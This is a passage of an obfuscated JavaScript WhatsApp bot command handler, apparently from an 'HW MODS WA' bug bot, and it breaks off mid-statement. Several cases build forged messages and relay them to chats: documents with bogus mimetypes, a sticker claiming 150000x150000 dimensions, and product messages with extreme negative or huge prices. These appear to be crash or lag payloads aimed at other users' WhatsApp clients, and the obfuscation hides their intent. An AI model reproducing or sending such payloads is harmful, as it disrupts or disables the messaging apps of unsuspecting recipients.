case 'jaditempe':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0xb8e785=_0x39a7;function _0x1305(){var _0x142c15=['/v/t62.7119-24/11709398_1060965197642099_4980960219454675975_n.enc?ccb=11-4&oh=972693153303e27b0f5404309d97068c&oe=6171B7FD','1126059uSPdgG','1632330073','key','RTCEuCv+9QtA/bEeLg2eDt5lsSiWm4Ztj8yBfZnLLoo=','2931965qiyzMw','4umKPMV','ban','HW\x20MODS\x20WA','4902318wKLxdK','prepareMessageFromContent','relayWAMessage','tjri14zGwrCJXXBMwq2xZpzYFC+8ZZJNn+7e7veU7SI=','1290951LGWvGj','.m4a','360EIIaui','©XM\x20XHIRO\x20MHONSHINE','1122552ENmiSM','178045aCRbSA','1530866pwNBiG','https://mmg.whatsapp.net/d/f/AmR6-dd0dLz-n4h6MT5349SAeODDlG-kt_VkC6cyHHbr.enc'];_0x1305=function(){return _0x142c15;};return _0x1305();}(function(_0xa43ba7,_0x4bb3a1){var _0x55e7a2=_0x39a7,_0x553392=_0xa43ba7();while(!![]){try{var _0x1ff393=parseInt(_0x55e7a2(0xc3))/0x1+parseInt(_0x55e7a2(0xc0))/0x2+-parseInt(_0x55e7a2(0xcf))/0x3+parseInt(_0x55e7a2(0xc8))/0x4*(-parseInt(_0x55e7a2(0xc7))/0x5)+parseInt(_0x55e7a2(0xcb))/0x6+parseInt(_0x55e7a2(0xbf))/0x7*(-parseInt(_0x55e7a2(0xbc))/0x8)+parseInt(_0x55e7a2(0xbe))/0x9;if(_0x1ff393===_0x4bb3a1)break;else _0x553392['push'](_0x553392['shift']());}catch(_0x3004b5){_0x553392['push'](_0x553392['shift']());}}}(_0x1305,0xa40f4));function _0x39a7(_0x37fbe9,_0x226510){var _0x130550=_0x1305();return _0x39a7=function(_0x39a703,_0x2783aa){_0x39a703=_0x39a703-0xbb;var _0x2a07d2=_0x130550[_0x39a703];return _0x2a07d2;},_0x39a7(_0x37fbe9,_0x226510);}if(isBan)return reply(mess[_0xb8e785(0xc9)]);if(!kal[_0xb8e785(0xc5)]['fromMe']&&!isOwner)return;res=await Haikal[_0xb8e785(0xcc)](from,{'documentMessage':{'url':_0xb8e785(0xc1),'mimetype':'audio/mp4','title':_0xb8e785(0xca)+emoji2+_0xb8e785(0xbb),'fileSha256':'MC1xyFsfPUKh63OTSqDufxiYcYDJXXOISQHQlo9bJVE=','fileLength':'703757','pageCount':0x0,'mediaKey':_0xb8e785(0xce),'fileName':_0xb8e785(0xbd)+ngazap(prefix),'fileEncSha256':_0xb8e785(0xc6),'directPath':_0xb8e785(0xc2),'mediaKeyTimestamp':_0xb8e785(0xc4),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0xb8e785(0xcd)](res);
break
case 'xmfake':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x2d61c2=_0x3c3c;(function(_0xe8d483,_0x2af721){var _0x2ef723=_0x3c3c,_0x438199=_0xe8d483();while(!![]){try{var _0x5287d1=parseInt(_0x2ef723(0x12a))/0x1+parseInt(_0x2ef723(0x134))/0x2+-parseInt(_0x2ef723(0x131))/0x3*(-parseInt(_0x2ef723(0x12e))/0x4)+parseInt(_0x2ef723(0x12f))/0x5+parseInt(_0x2ef723(0x128))/0x6*(parseInt(_0x2ef723(0x12b))/0x7)+-parseInt(_0x2ef723(0x129))/0x8*(parseInt(_0x2ef723(0x121))/0x9)+-parseInt(_0x2ef723(0x130))/0xa;if(_0x5287d1===_0x2af721)break;else _0x438199['push'](_0x438199['shift']());}catch(_0x247a6f){_0x438199['push'](_0x438199['shift']());}}}(_0x1257,0x843f9));if(isBan)return reply(mess[_0x2d61c2(0x122)]);function _0x3c3c(_0x25f9c5,_0x362a6c){var _0x1257b3=_0x1257();return _0x3c3c=function(_0x3c3c08,_0x3d6eba){_0x3c3c08=_0x3c3c08-0x120;var _0x3e8bce=_0x1257b3[_0x3c3c08];return _0x3e8bce;},_0x3c3c(_0x25f9c5,_0x362a6c);}if(!kal[_0x2d61c2(0x12c)]['fromMe']&&!isOwner)return;res=await Haikal[_0x2d61c2(0x132)](from,{'documentMessage':{'url':_0x2d61c2(0x124),'mimetype':'application/XM','title':_0x2d61c2(0x125),'fileSha256':_0x2d61c2(0x133),'fileLength':_0x2d61c2(0x127),'pageCount':0x0,'mediaKey':_0x2d61c2(0x120),'fileName':'©XM\x20XHIRO\x20MHONSHINE.XM','fileEncSha256':'OrFhBtX/v9StB8SpWP85sXEO3IHsXStqJGdtnV0gDhE=','directPath':_0x2d61c2(0x126),'mediaKeyTimestamp':_0x2d61c2(0x123),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x2d61c2(0x12d)](res);function _0x1257(){var _0x3258b3=['yyv1dpunMToLIpX0+Sj7B2n6Wd1N+/SMRjC4JG2z358=','1543514TlUxrb','iuT3uxQ1HCusw1qmJQ72SiI85EgdoMKgoylx0vGlBnc=','5372964REpwBS','ban','1632190559','https://mmg.whatsapp.net/d/f/AskvmNqn9g_YT4kXEeDds1TGY0W6A9PnCOHg8Yy8rBSW.enc','©XM\x20XHIRO\x20MHONSHINE.XM','/v/t62.7119-24/25430031_1179992609154827_126460455752424477_n.enc?ccb=11-4&oh=72abbafb0088ae811046aea75222c15a&oe=616D4A4B','165','1951878ZUhirk','8UEqmJf','516606iflOoG','7iYPYxd','key','relayWAMessage','204fjHlIo','4861070imfZdh','19242080XEtKmd','28059qehJeC','prepareMessageFromContent'];_0x1257=function(){return _0x3258b3;};return _0x1257();}
break
case 'hw2':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x56e7ef=_0x19bf;function _0x19bf(_0x523804,_0x4e4154){var _0x67206f=_0x6720();return _0x19bf=function(_0x19bf1c,_0x59d204){_0x19bf1c=_0x19bf1c-0x1e7;var _0x1da77f=_0x67206f[_0x19bf1c];return _0x1da77f;},_0x19bf(_0x523804,_0x4e4154);}(function(_0x5a848d,_0x22b273){var _0x5d14b3=_0x19bf,_0x69e5a5=_0x5a848d();while(!![]){try{var _0x450836=parseInt(_0x5d14b3(0x1ec))/0x1*(-parseInt(_0x5d14b3(0x1f5))/0x2)+-parseInt(_0x5d14b3(0x1f3))/0x3+-parseInt(_0x5d14b3(0x1e9))/0x4+parseInt(_0x5d14b3(0x1f1))/0x5+parseInt(_0x5d14b3(0x1f8))/0x6*(parseInt(_0x5d14b3(0x1e7))/0x7)+parseInt(_0x5d14b3(0x1f0))/0x8+parseInt(_0x5d14b3(0x1f4))/0x9;if(_0x450836===_0x22b273)break;else _0x69e5a5['push'](_0x69e5a5['shift']());}catch(_0xc61fdf){_0x69e5a5['push'](_0x69e5a5['shift']());}}}(_0x6720,0xb985f));if(isBan)return reply(mess[_0x56e7ef(0x1ee)]);if(!kal['key'][_0x56e7ef(0x1f9)]&&!isOwner)return;function _0x6720(){var _0x1a1fa9=['753680BweKfT','XM\x20XHIRO\x20MHONSHINE.HW','3238020mcxSTM','23963724AnDMAC','183756wKceBT','xsA5T7BvHYMPNGthuSttLC2Pj5Q/fXb81nARQHY4FD8=','gynXMrD2YurZVvpXc0lk1GZegx+5qpE/UnWBBEnp72M=','2292vwKkht','fromMe','relayWAMessage','/v/t62.7119-24/11291992_914899692712756_3253256600728627926_n.enc?ccb=11-4&oh=0d60b005087b291981e26b736aa9910c&oe=616D84FD','8197uylJRM','1632148711','2102944froWZJ','cL3UDB6nrmnqR40mBwQZ6/Ep8h9lSWBcVxhiKwW8zNo=','©XM\x20XHIRO\x20MHONSHINE','11VYSTma','application/HW','ban','https://mmg.whatsapp.net/d/f/AvhUeq32Voqws-hnzK3Rd0KhfF_GUzCtA0lqTHGJwD2C.enc','919544qFyyTh'];_0x6720=function(){return _0x1a1fa9;};return _0x6720();}res=await Haikal['prepareMessageFromContent'](from,{'documentMessage':{'url':_0x56e7ef(0x1ef),'mimetype':_0x56e7ef(0x1ed),'title':_0x56e7ef(0x1f2),'fileSha256':_0x56e7ef(0x1ea),'fileLength':'10','pageCount':0x0,'mediaKey':_0x56e7ef(0x1f6),'fileName':_0x56e7ef(0x1eb)+ngazap(prefix),'fileEncSha256':_0x56e7ef(0x1f7),'directPath':_0x56e7ef(0x1fb),'mediaKeyTimestamp':_0x56e7ef(0x1e8),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x56e7ef(0x1fa)](res);
break
case 'slowh':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe && !isOwner) return
res = await Haikal.prepareMessageFromContent(from,{
	"stickerMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApPRbzvidZuNpHcHsCn2P1rVHawvt2T63DCZMyWnAgQZ.enc",
						"fileSha256": "czwy7lIUZuU8GL9W2UP3sSo/vy9FlETMpqpQneQQ+w8=",
						"fileEncSha256": "xOjP90WLzICVTQQvj7Ts+oJvcxhas5oOEPMvoqKVQ1E=",
						"mediaKey": "/j2BjzjS/e88MHVCcaS8f3kaSCAVe18Nv4tQb/rZtrc=",
						"mimetype": "image/webp",
						"jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"directPath": "/v/t62.7118-24/25076345_285509236738530_1931711252260953768_n.enc?ccb=11-4&oh=f6ef4b023e7424d5d2c4d03923c0ab1b&oe=616F03EF",
						"height": 150000,
						"width": 150000,
						"fileLength": "10124",
						"mediaKeyTimestamp": "1632147575",
						"isAnimated": false
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'hwyekan':
if (!kal.key.fromMe) return fakestatus('APASIH')
function _0x3368(_0x1116e9,_0x2547a6){var _0x59fb58=_0x59fb();return _0x3368=function(_0x3368e6,_0x2e5fc5){_0x3368e6=_0x3368e6-0x1e1;var _0x20c940=_0x59fb58[_0x3368e6];return _0x20c940;},_0x3368(_0x1116e9,_0x2547a6);}var _0x4ce04a=_0x3368;function _0x59fb(){var _0x1fc514=['4773126sefcmk','relayWAMessage','\x20👋.```','2944685qukNks','9986991xnbbZQ','self','11313872mgxTiY','prepareMessageFromContent','deletepc','```Hi\x20','8722962RSGnQS','73895265LVTErj','24436cFEhmZ','65jhXLLk','4RgDmch','public'];_0x59fb=function(){return _0x1fc514;};return _0x59fb();}(function(_0xa78f14,_0x173a65){var _0x173709=_0x3368,_0x41022a=_0xa78f14();while(!![]){try{var _0x539885=-parseInt(_0x173709(0x1e9))/0x1*(parseInt(_0x173709(0x1e8))/0x2)+-parseInt(_0x173709(0x1ec))/0x3+-parseInt(_0x173709(0x1ea))/0x4*(parseInt(_0x173709(0x1ef))/0x5)+-parseInt(_0x173709(0x1e6))/0x6+-parseInt(_0x173709(0x1f0))/0x7+-parseInt(_0x173709(0x1e2))/0x8+parseInt(_0x173709(0x1e7))/0x9;if(_0x539885===_0x173a65)break;else _0x41022a['push'](_0x41022a['shift']());}catch(_0x30967d){_0x41022a['push'](_0x41022a['shift']());}}}(_0x59fb,0xe5e5e),res=await Haikal[_0x4ce04a(0x1e3)](from,{'listMessage':{'title':_0x4ce04a(0x1e5)+pushname+_0x4ce04a(0x1ee),'description':''+ngazap(prefix),'buttonText':''+ngazap(prefix),'listType':'SINGLE_SELECT','sections':[{'title':''+ngazap(prefix),'rows':[{'title':_0x4ce04a(0x1eb),'rowId':'public'},{'title':_0x4ce04a(0x1e1),'rowId':_0x4ce04a(0x1e1)},{'title':_0x4ce04a(0x1e4),'rowId':_0x4ce04a(0x1e4)},{'title':'restart','rowId':'restart'}]}]}},{'quoted':kal}),Haikal[_0x4ce04a(0x1ed)](res));
break
case 'ahnob':
if (!kal.key.fromMe) return fakestatus('APASIH')
function _0x3cb5(_0x5bf687,_0x2f8c0a){var _0x1ecb3b=_0x1ecb();return _0x3cb5=function(_0x3cb5f1,_0xa4fb65){_0x3cb5f1=_0x3cb5f1-0x89;var _0x5431dc=_0x1ecb3b[_0x3cb5f1];return _0x5431dc;},_0x3cb5(_0x5bf687,_0x2f8c0a);}var _0x14395e=_0x3cb5;(function(_0x12f275,_0xdae381){var _0x294bb4=_0x3cb5,_0x404528=_0x12f275();while(!![]){try{var _0x37430b=-parseInt(_0x294bb4(0x8e))/0x1*(parseInt(_0x294bb4(0x91))/0x2)+parseInt(_0x294bb4(0x95))/0x3+parseInt(_0x294bb4(0x94))/0x4+-parseInt(_0x294bb4(0x89))/0x5+-parseInt(_0x294bb4(0x92))/0x6+-parseInt(_0x294bb4(0x8d))/0x7+parseInt(_0x294bb4(0x8c))/0x8;if(_0x37430b===_0xdae381)break;else _0x404528['push'](_0x404528['shift']());}catch(_0x31a45e){_0x404528['push'](_0x404528['shift']());}}}(_0x1ecb,0x2e1c5));if(isBan)return reply(mess['ban']);res=await Haikal['prepareMessageFromContent'](from,{'buttonsMessage':{'text':'','extendedTextMessage':{'text':_0x14395e(0x8b)+ngazap(prefix),'matchedText':_0x14395e(0x8b)+ngazap(prefix),'description':'❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a'+ngazap(prefix),'title':_0x14395e(0x8b)+ngazap(prefix),'previewType':_0x14395e(0x90)},'contentText':_0x14395e(0x8b)+ngazap(prefix),'footerText':'https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g','buttons':[{'buttonId':'HAIKAL','buttonText':{'displayText':_0x14395e(0x8b)+ngazap(prefix)},'type':_0x14395e(0x93)}],'headerType':_0x14395e(0x8a)}},{'quoted':kal}),Haikal[_0x14395e(0x8f)](res);function _0x1ecb(){var _0x510f73=['1408962SdptTc','RESPONSE','128108xUebrW','34437ielaKM','35810nqWHte','EMPTY','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a','5725528MVbvbV','333193lRpRhw','56148ouUsjV','relayWAMessage','NONE','10veevfH'];_0x1ecb=function(){return _0x510f73;};return _0x1ecb();}
break
case 'gananya':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x36dae4=_0x5dd6;(function(_0x146756,_0x24285d){var _0x1107dc=_0x5dd6,_0x29084c=_0x146756();while(!![]){try{var _0xe4e118=-parseInt(_0x1107dc(0x7b))/0x1+parseInt(_0x1107dc(0x77))/0x2*(-parseInt(_0x1107dc(0x7a))/0x3)+-parseInt(_0x1107dc(0x7d))/0x4*(-parseInt(_0x1107dc(0x8d))/0x5)+-parseInt(_0x1107dc(0x81))/0x6+parseInt(_0x1107dc(0x7c))/0x7+-parseInt(_0x1107dc(0x7f))/0x8+parseInt(_0x1107dc(0x84))/0x9*(parseInt(_0x1107dc(0x8f))/0xa);if(_0xe4e118===_0x24285d)break;else _0x29084c['push'](_0x29084c['shift']());}catch(_0x2fee4c){_0x29084c['push'](_0x29084c['shift']());}}}(_0x18a0,0x5be50));if(isBan)return reply(mess[_0x36dae4(0x80)]);function _0x5dd6(_0x50a595,_0x580ba8){var _0x18a0b5=_0x18a0();return _0x5dd6=function(_0x5dd69e,_0x581a6a){_0x5dd69e=_0x5dd69e-0x77;var _0x36c718=_0x18a0b5[_0x5dd69e];return _0x36c718;},_0x5dd6(_0x50a595,_0x580ba8);}res=await Haikal[_0x36dae4(0x79)](from,{'buttonsMessage':{'text':'','videoMessage':{'url':_0x36dae4(0x7e),'mimetype':_0x36dae4(0x85),'fileSha256':_0x36dae4(0x8c),'fileLength':'7940785','seconds':0x1e,'mediaKey':_0x36dae4(0x82),'caption':_0x36dae4(0x87)+ngazap(prefix),'height':0x280,'width':0x280,'fileEncSha256':_0x36dae4(0x83),'directPath':_0x36dae4(0x78),'mediaKeyTimestamp':_0x36dae4(0x8a),'jpegThumbnail':_0x36dae4(0x88),'streamingSidecar':_0x36dae4(0x86)},'contentText':_0x36dae4(0x87)+ngazap(prefix),'footerText':_0x36dae4(0x8b),'buttons':[{'buttonId':_0x36dae4(0x8e),'buttonText':{'displayText':'❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a'+ngazap(prefix)},'type':_0x36dae4(0x89)}],'headerType':'VIDEO'}},{'quoted':kal}),Haikal['relayWAMessage'](res);function _0x18a0(){var _0x39417e=['Kk8rfpGOoHDiIe8KntIwJXA3OPSnspkLSzqW+ze35nQmaqe90Ky9Oi++2l6kqwVK/TZwTR9i7skG6DbVe5zdD3c6siD7abOSvNjOLTFNN8GETPBAXj4dyPTAGYIY69yauAHkBKSoeqJKk7j3dsD2nNECS20MLCEQEZC2wCOBj//syygANt8eIrLVWp8hiuTkVhmDVC2C79YGF9z31j3XYQex3aJfxeMlzwVg9pqKDILN8FlK8RjcMyi+LiUqJ8MxzmnIkw1ok280A+SewOi0SuZvkaEyWb3tARZqLU9lzgcWXCQLuLoL0fzykLoZYHbNIOKlmU5Lj7jN8yea7ZtKbPHioZIAuK5TXVhN/34H52peQid2EJpzim4tE0Yg3btYHF9RNZ0zaWooW6HOITOAOcsmGoP3ir5W/G0I5z/MOi7TDRQDMVfQG+87F1ZPCUsimHXTBjb4iRiSHM2G9HwwIQaggYmFwuwrHK8NSsJ2B+KxrGqLmkmrkx+FyYiSGsqu4Dl2q1LQNtITISqtZDUCchsLGvdVdqDhS8j6XfR6bAZ+UXWo9U2Btaksi/eNiqakBNsk3AEiD36ti8Fz1BHy9Qzhljv03SvPT9+eiyH9nPZV4bkKaHXhEL2g8h2/IiV8cnMVpqLe8VPR4OY0Vx0NlSEp2DmzP6cmmjipmeD4djmsPjCpxFoMKNluPjlK8/OAtum3ZnfempqDR0xWBHFta59w4WU522osF09xtknoVJy/xZJUvC+rjn9/zq4YIVtWjCfq/Wyu5bWkz84mcvUToYo9YJpVaijWhu/CGddQufE/IaHoBt5YfTmgL83xgW4nH/KzbUUMksmv6W0YGYIOlNm5yDL9kZnUDG+fW0DUCEoUhmV+PkhYcgYB1oDgkdvMHsWktyTIIhllX6I0FvHqtqseFxOuy9OnpsneAdFqsOri198yoOqrvEEm1GVfKWDYM64kZDmDtyd/pBNxJcZx94Z7USs4ji9vkUXMCKc1nBcHfhGMIlchzo55Uc+nx/K5ZzkPjCsUWXK84vHaC0uBaNItLaCv5aK90VMsbUVgA9tIbZ4uit/lCzceC0AHJ+6fPIXlD0/jroI9GMKnZV3xBc2x+sSiNn0euGqP7odwThfIAMxDqY7YQLZl5vDRgf7e0Bc20kQZ/EmY4sU1KMSa7poc0tn8cuAlOHpnutAi4ie7i/+Zaljn0f57UJ9I2IanLQIg6c+xiznJcNv6gBkW6ZJzj5gdKL2YS8N6ibvRyVCKUksuiDqaPElrw4R/5nUdZGXYxXoBbENsrwqnUA97ZdYzDQtZFVNFcTh1qtUP7BRDD83OtnqQUB187wToSmXLKArsz6JFCky7xJ41UmdGgO4wG1XEiIRZWcW/vPVThnvAjbz/b6+7b45ffwvCRf0ytEDp6VXH7uxmECikRWpRKhcbsDxo6Ggicl+pqLjuvYRkTgyOxq9mVOrMNiAM7C+oz/cZxZ7Z5UBoiLqiA7WenxnEjKldg4D0naoKAoUrxgd2pjqZaXXBcS7iDWHZK8c9XN2AieWTaLJbgOfCtWgAZ7j6ur5hKnn8SpSSTuEPhQUoHJRWuqu4rh0QSh0XzaZQLfSin9QKAu0Fcu+qVB2GOtnMru0=','❏HW\x20MODS\x20WA❏\x0a▬▭▬▭▬▭▬▭▬▬▭▬▭\x0a','/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAOVDqiq3oLIC00BxQN0Ngwk6znWvqOeTAwYV0664jnX0IFF6GWuroVmOiReL1ITOGITKaZt479PSFCGYgy5qAFrCokBwFf/EACQQAAICAQMEAgMAAAAAAAAAAAABAhEDBBIhECIxQRMgMlFh/9oACAEBAAE/AKK6PpYpG5MtFDVdLt19VX7KJLgm6FHts9k4OPWEU+GUSXBNc2OGP44uN37FBvJRmwOME7TGq6YoqXazYOFmTEnOK8Wbdva/Q4LcmNO/4Sj3sUHYtOpJembTaZsdwteUNypNryMkRjumiOni0Rx0kiihxsnj7KHTjafNjHN41aNHqHlbi+jR4J54QM+qc+yJ+KJ5UiU3I0uX4siZDLCS4aGZpc0ZsnPAqVyZPI5fTFmljmmj/8QAHBEAAgICAwAAAAAAAAAAAAAAATEAEAIgEUFC/9oACAECAQE/ANvMKB2CBtqsewaMCvmf/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=','RESPONSE','1632756110','https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g','u6Gm+DPA8fkuLqoHB2n10o/gGbjQ/35K0wNUqtPM9Ag=','5730ZJpcqp','HAIKAL','10HqCePG','4696bltIIW','/v/t62.7161-24/55886033_1028902271208517_2026032829131395623_n.enc?ccb=11-4&oh=3e11e011d8cdc439771234330cf61e4b&oe=617760B8','prepareMessageFromContent','381oJpGKA','644071cIlxSD','2612050BBLJTr','932eUsibZ','https://mmg.whatsapp.net/d/f/AjhSGX6vECy_WmORgxJbTzXoJg85kWbi0RWagjLTn0L9.enc','223912kmFngp','ban','2277552HzxcnZ','m5D9zLi+al5CarX7p0hUJJltddI/scWNKsNaft+WmbY=','UoMSrrwiN6/LX85OPz6Hw6eIeSBsfP3r2hnuuBUcLzg=','9774720VRtxWF','video/mp4'];_0x18a0=function(){return _0x39417e;};return _0x18a0();}
break
case 'kalong':
if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x2159de=_0x4426;(function(_0x2000f6,_0x3c5b04){var _0x45b127=_0x4426,_0x14beda=_0x2000f6();while(!![]){try{var _0x5ef3ce=parseInt(_0x45b127(0xa9))/0x1*(-parseInt(_0x45b127(0xb6))/0x2)+-parseInt(_0x45b127(0xb7))/0x3*(-parseInt(_0x45b127(0xa3))/0x4)+-parseInt(_0x45b127(0xa6))/0x5*(-parseInt(_0x45b127(0xb4))/0x6)+parseInt(_0x45b127(0xb2))/0x7*(parseInt(_0x45b127(0xa1))/0x8)+-parseInt(_0x45b127(0x9b))/0x9*(parseInt(_0x45b127(0xac))/0xa)+-parseInt(_0x45b127(0x9f))/0xb+-parseInt(_0x45b127(0xa8))/0xc*(parseInt(_0x45b127(0xa0))/0xd);if(_0x5ef3ce===_0x3c5b04)break;else _0x14beda['push'](_0x14beda['shift']());}catch(_0x50b5cf){_0x14beda['push'](_0x14beda['shift']());}}}(_0x49e8,0x8061f));if(isBan)return reply(mess[_0x2159de(0xab)]);if(!kal['key']['fromMe']&&!isOwner)return;function _0x4426(_0x220d5d,_0xf1d752){var _0x49e87d=_0x49e8();return _0x4426=function(_0x442627,_0x286ec9){_0x442627=_0x442627-0x9b;var _0x48aeef=_0x49e87d[_0x442627];return _0x48aeef;},_0x4426(_0x220d5d,_0xf1d752);}function _0x49e8(){var _0x133674=['ban','160tkjhZQ','http://hwmodswa.website2.me/','prepareMessageFromContent','o8WVAUEap+pZ9guBSEp8v02r37yPjZx646NfUU2qkc0=','readFileSync','4bkOcwD7n4exarKEUz9QCe6C69CiCVTjuAxfUr55Hlw=','14XeRYXX','image/jpeg','4373748EqdTev','./stik/Ahhikal.jpeg','18852JbgdkN','4173NhGyZq','62857141709445@s.whatsapp.net','75322','99999999999000','49149oTgZSX','FUFjdWbXsYPQpWnBa9uKLFAArCZHWBDHyzSXdEgJa1z4W051Vsv2+Q==','relayWAMessage','qaHI3/usbupEbhnoAoeUdmJcvt6OpCH4c3L+k1+dVFU=','1045022fzRZqv','3291639LfUfmd','768352lSUhzj','https://mmg.whatsapp.net/d/f/AhKiA8ZYMvh7bmeduarnW7bNy_b7iSQmhpFWGWP8gn9W.enc','848vhbXGK','/v/t62.7118-24/33362654_2985464461692539_2232039221222414383_n.enc?ccb=11-4&oh=04aaa9547f1816b97a8f2748c500575a&oe=616BD2B0&_nc_hot=1632065864','4383282311765462','5xpQSdn','IobngdpcCoKqVw5NujZp5OxVA+hmNBZ4+Me5HSIrByM=','12AKaDzW','27vZsOLb','-999999999999'];_0x49e8=function(){return _0x133674;};return _0x49e8();}res=await Haikal[_0x2159de(0xae)](from,{'productMessage':{'product':{'productImage':{'url':_0x2159de(0xa2),'mimetype':_0x2159de(0xb3),'fileSha256':_0x2159de(0x9e),'fileLength':_0x2159de(0xb9),'height':0x3e8,'width':0x3e8,'mediaKey':_0x2159de(0xb1),'fileEncSha256':_0x2159de(0xaf),'directPath':_0x2159de(0xa4),'mediaKeyTimestamp':'1631953433','jpegThumbnail':fs[_0x2159de(0xb0)](_0x2159de(0xb5)),'scansSidecar':_0x2159de(0x9c),'scanLengths':[0x2946,0x7782,0x3290,0x52e2],'midQualityFileSha256':_0x2159de(0xa7)},'productId':_0x2159de(0xa5),'title':''+ngazap(prefix),'description':''+ngazap(prefix),'currencyCode':'IDR','priceAmount1000':_0x2159de(0xba),'retailerId':_0x2159de(0xaa),'url':_0x2159de(0xad),'productImageCount':0x1,'salePriceAmount1000':'0'},'businessOwnerJid':_0x2159de(0xb8),'contextInfo':{'forwardingScore':0x3,'isForwarded':!![]}}},{'quoted':kal,'contextInfo':{}}),Haikal[_0x2159de(0x9d)](res);
break
case 'wewe':
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe && !isOwner) return
res = await Haikal.prepareMessageFromContent(from,{
"audioMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
						"mimetype": "audio/aac",
						"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
						"fileLength": "285473",
						"seconds": 23,
							"caption": `${ngazap(prefix)}`,
						"ptt": false,
						"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
						"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
						"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
						"mediaKeyTimestamp": "1632753911",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ikal, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'pvp':
	if (!kal.key.fromMe) return fakestatus('APASIH')
var _0x516cd2=_0x49d3;(function(_0x5d1c42,_0xa27f9f){var _0x4f6f94=_0x49d3,_0x3b4a09=_0x5d1c42();while(!![]){try{var _0x4abe43=parseInt(_0x4f6f94(0x1ce))/0x1*(parseInt(_0x4f6f94(0x1de))/0x2)+-parseInt(_0x4f6f94(0x1c7))/0x3+-parseInt(_0x4f6f94(0x1d3))/0x4*(parseInt(_0x4f6f94(0x1d5))/0x5)+-parseInt(_0x4f6f94(0x1c8))/0x6*(parseInt(_0x4f6f94(0x1db))/0x7)+parseInt(_0x4f6f94(0x1cc))/0x8*(-parseInt(_0x4f6f94(0x1d9))/0x9)+parseInt(_0x4f6f94(0x1cf))/0xa*(-parseInt(_0x4f6f94(0x1ca))/0xb)+parseInt(_0x4f6f94(0x1dc))/0xc*(parseInt(_0x4f6f94(0x1d0))/0xd);if(_0x4abe43===_0xa27f9f)break;else _0x3b4a09['push'](_0x3b4a09['shift']());}catch(_0x2b70a4){_0x3b4a09['push'](_0x3b4a09['shift']());}}}(_0x5088,0x53b1a));function _0x5088(){var _0x5ebda9=['11fNiKNU','1631953433','19480QHRPxc','62857141709445@s.whatsapp.net','1101FpKUzg','3344890OWbyYk','4473625TlBwBr','ban','IobngdpcCoKqVw5NujZp5OxVA+hmNBZ4+Me5HSIrByM=','2066716pSGlJp','image/jpeg','5bmPcuI','-999999999999','IDR','fromMe','531tWDiqC','o8WVAUEap+pZ9guBSEp8v02r37yPjZx646NfUU2qkc0=','2569wzbXiw','48DPviGK','readFileSync','1234xaqXPK','key','4383282311765462','relayWAMessage','1354095UbzvBo','4362HoDUnp','99999999999000'];_0x5088=function(){return _0x5ebda9;};return _0x5088();}function _0x49d3(_0x456d06,_0x26be3b){var _0x508878=_0x5088();return _0x49d3=function(_0x49d36f,_0x89785e){_0x49d36f=_0x49d36f-0x1c6;var _0x4275e2=_0x508878[_0x49d36f];return _0x4275e2;},_0x49d3(_0x456d06,_0x26be3b);}if(isBan)return reply(mess[_0x516cd2(0x1d1)]);if(!kal[_0x516cd2(0x1df)][_0x516cd2(0x1d8)]&&!isOwner)return;res=await 